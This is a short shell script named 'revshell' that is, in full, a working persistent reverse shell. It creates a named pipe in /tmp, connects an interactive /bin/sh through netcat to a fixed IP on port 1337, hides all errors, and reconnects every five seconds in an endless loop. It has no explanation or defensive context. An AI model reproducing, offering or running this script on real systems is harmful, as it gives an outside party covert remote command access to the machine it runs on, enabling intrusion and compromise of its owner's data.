#!/bin/sh
# Name: revshell
# Author: em

HOST_IP=10.164.150.11
HOST_PORT=1337

while true; do
	rm -f /tmp/f2 2>/dev/null; mkfifo /tmp/f2 2>/dev/null; cat /tmp/f2 2>/dev/null | /bin/sh -i 2>&1 | nc -w 10 $HOST_IP:$HOST_PORT 2>/dev/null | tee -a /tmp/f2 2>/dev/null >/dev/null
	sleep 5
done
